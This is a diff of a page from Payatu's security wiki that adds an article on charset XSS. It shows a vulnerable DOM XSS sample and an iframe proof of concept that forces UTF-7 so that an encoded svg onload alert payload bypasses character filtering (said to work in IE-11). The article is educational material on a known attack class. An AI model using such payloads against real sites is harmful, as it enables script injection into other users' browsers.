@@ -2,19 +2,25 @@
 <head>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="Hello">
+<meta name=description content="Charset XSS #  Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
+For example consider the following codes
+<?php if(isset($_GET['xss'])) { echo htmlspecialchars($_GET['xss']); } ?> and similarly for DOM XSS code
+<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string.">
 <meta name=theme-color content="#FFFFFF">
 <meta name=color-scheme content="light dark"><meta property="og:title" content="Charset XSS">
-<meta property="og:description" content="Hello">
+<meta property="og:description" content="Charset XSS #  Charset XSS is useful in cases where application filters HTML special characters like < & >, You might have seen these characters converting back into &amp;gt; & &amp;lt; respectively.
+For example consider the following codes
+<?php if(isset($_GET['xss'])) { echo htmlspecialchars($_GET['xss']); } ?> and similarly for DOM XSS code
+<html> <head> <title>test page</title> </head> <body> <script> var bad_string = window.location.hash.substring(1); var regex = /<\>/gi; var good_string = bad_string.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://payatu.github.io/cybersec-wiki/docs/application-security/web/charset-xss/"><meta property="article:section" content="docs">
-<meta property="article:modified_time" content="2022-01-24T03:17:15+05:30">
+<meta property="article:modified_time" content="2022-01-24T03:24:14+05:30">
 <title>Charset XSS | Cyber Security Wiki</title>
 <link rel=manifest href=/cybersec-wiki/manifest.json>
 <link rel=icon href=/cybersec-wiki/favicon.png type=image/x-icon>
 <link rel=stylesheet href=/cybersec-wiki/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css integrity="sha256-VlqV4gQ0k5SeP6cts+wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin=anonymous>
 <script defer src=/cybersec-wiki/flexsearch.min.js></script>
-<script defer src=/cybersec-wiki/en.search.min.2cf09ff8077250c3a6510e4ce6e1d835b14f1b72642130c9376ffe24794c7e8f.js integrity="sha256-LPCf+AdyUMOmUQ5M5uHYNbFPG3JkITDJN2/+JHlMfo8=" crossorigin=anonymous></script>
+<script defer src=/cybersec-wiki/en.search.min.1594a45af69c87206bac09dff0f56741ff5dd8987d2fd252f20fec77d8736c55.js integrity="sha256-FZSkWvachyBrrAnf8PVnQf9d2Jh9L9JS8g/sd9hzbFU=" crossorigin=anonymous></script>
 <script defer src=/cybersec-wiki/sw.min.fb2e6c0dce0eabc0edf2e75c24169d58b0b4593b594c341febf51df5f9615d11.js integrity="sha256-+y5sDc4Oq8Dt8udcJBadWLC0WTtZTDQf6/Ud9flhXRE=" crossorigin=anonymous></script>
 </head>
 <body dir=ltr>
@@ -159,14 +165,96 @@ Secure Code Wiki by Payatu
 </label>
 </div>
 <aside class="hidden clearfix">
-<nav id=TableOfContents></nav>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#charset-xss>Charset XSS</a>
+<ul>
+<li><a href=#requirements>Requirements</a></li>
+<li><a href=#example-works-in-ie-11>Example works in IE-11</a></li>
+</ul>
+</li>
+</ul>
+</nav>
 </aside>
 </header>
-<article class=markdown><p>Hello</p>
+<article class=markdown><h1 id=charset-xss>
+Charset XSS
+<a class=anchor href=#charset-xss>#</a>
+</h1>
+<p>Charset XSS is useful in cases where application filters HTML special characters like <code>&lt;</code> & <code>></code>, You might have seen these characters converting back into <code>&amp;gt;</code> & <code>&amp;lt;</code> respectively.</p>
+<p>For example consider the following codes</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;?php
+if(isset($_GET[&#39;xss&#39;])) {
+    echo htmlspecialchars($_GET[&#39;xss&#39;]);
+}
+?&gt;
+</code></pre></div><p>and similarly for DOM XSS code</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;test page&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            var bad_string = window.location.hash.substring(1);
+            var regex = /&lt;\&gt;/gi;
+            var good_string = bad_string.replace(regex,&#39;&#39;)
+            document.write(good_string);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>using charset XSS it is possible to bypass html special characters filtration</p>
+<h2 id=requirements>
+Requirements
+<a class=anchor href=#requirements>#</a>
+</h2>
+<ul>
+<li>Target site not implemented charset</li>
+<li>Target site implemented the wrong charset</li>
+</ul>
+<h2 id=example-works-in-ie-11>
+Example works in IE-11
+<a class=anchor href=#example-works-in-ie-11>#</a>
+</h2>
+<p>Consider the same DOM XSS code</p>
+<details open><summary>xss.html</summary>
+<div class=markdown-inner>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;test page&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            var bad_string = window.location.hash.substring(1);
+            var regex = /&lt;\&gt;/gi;
+            var good_string = bad_string.replace(regex,&#39;&#39;)
+            document.write(good_string);
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+</div>
+</details>
+<p>Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.</p>
+<details open><summary>iframe.html</summary>
+<div class=markdown-inner>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;UTF-7&#34;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe src=&#34;http://lab.com:8888/common/c.html#&lt;p&gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-&lt;/p&gt;&#34; frameborder=&#34;1&#34;
+        height=&#34;300&#34; width=&#34;500&#34;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+</div>
+</details>
+<p>As soon as we access iframe.html we triage javaScript code execution since xss.html doesn&rsquo;t have any charset defined and hence browser inherit top frame&rsquo;s charset which is UTF-7.</p>
 </article>
 <footer class=book-footer>
 <div class="flex flex-wrap justify-between">
-<div><a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/commit/0b476ad1b0be80a2fcbd3ab2699129eb8cb4aec0 title="Last modified by 0xCardinal | January 23, 2022" target=_blank rel=noopener>
+<div><a class="flex align-center" href=https://github.com/payatu/cybersec-wiki/commit/0b5680939f959c015fe898c874e4cdcec3d6eaca title="Last modified by 0xcardinal | January 23, 2022" target=_blank rel=noopener>
 <img src=/cybersec-wiki/svg/calendar.svg class=book-icon alt=Calendar>
 <span>January 23, 2022</span>
 </a>
@@ -186,7 +274,16 @@ Secure Code Wiki by Payatu
 </div>
 <aside class=book-toc>
 <div class=book-toc-content>
-<nav id=TableOfContents></nav>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#charset-xss>Charset XSS</a>
+<ul>
+<li><a href=#requirements>Requirements</a></li>
+<li><a href=#example-works-in-ie-11>Example works in IE-11</a></li>
+</ul>
+</li>
+</ul>
+</nav>
 </div>
 </aside>
 </main>
